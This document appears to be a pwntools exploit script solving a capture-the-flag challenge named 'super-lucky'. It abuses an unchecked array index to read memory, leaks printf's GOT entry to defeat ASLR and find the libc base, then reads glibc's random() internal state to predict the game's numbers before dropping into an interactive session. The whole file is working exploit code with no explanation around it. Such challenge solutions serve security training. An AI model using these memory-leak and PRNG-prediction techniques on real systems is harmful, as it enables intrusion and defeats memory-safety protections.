#!/usr/bin/env python3

from pwn import *

elf = ELF("./super-lucky_patched")
libc = ELF("./libc.so.6")

context.binary = elf

def conn():
    if args.LOCAL:
        r = process([elf.path])
        # r = elf.debug()
    else:
        r = remote("localhost", 1337)

    return r

def wadd(a, b):
    return (a + b) % 2 ** 32

def main():
    r = conn()
    lucky_numbers = elf.sym["lucky_numbers"]
    printf_got = elf.got["printf"]
    r.recvline()

    def get(addr):
        i = (addr - lucky_numbers) % 2 ** 64 // 4
        r.sendline(f"{i}".encode())
        r.recvuntil(b": ")
        return p32(int(r.recvlineS().strip()), signed=True)

    leak = u64(get(printf_got) + get(printf_got + 4))
    base = leak - libc.sym["printf"]
    left = 0x1ba1d0
    right = 0x1ba1c4
    lefts = [u32(get(base + left + 4 * i)) for i in range(7)]
    rights = [u32(get(base + right + 4 * i)) for i in range(3)]

    s = [0] * 7
    s[0] = wadd(lefts[0], rights[0])
    s[1] = wadd(lefts[1], rights[1])
    s[2] = wadd(lefts[2], rights[2])
    s[3] = wadd(lefts[3], s[0])
    s[4] = wadd(lefts[4], s[1])
    s[5] = wadd(lefts[5], s[2])
    s[6] = wadd(lefts[6], s[3])

    for _ in range(9):
        r.sendline(b"0")
    for state in s:
        r.sendline(f"{state >> 1}".encode())
    r.interactive()

if __name__ == "__main__":
    main()
